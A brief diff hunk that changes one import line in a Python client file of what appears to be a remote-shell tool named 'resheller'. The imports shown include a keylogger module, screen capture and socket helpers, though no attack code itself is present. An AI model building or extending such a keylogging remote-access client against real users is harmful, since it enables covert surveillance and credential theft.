@@ -11,8 +11,8 @@ from time import sleep
 from mss import mss
 from requests import get
 
-from lib.output import usage
 from lib.pipe import SafeSocket
+from lib.stdout import usage
 from resheller.client.ip import get_ip
 from resheller.client.keylogger import KeyLogger
 
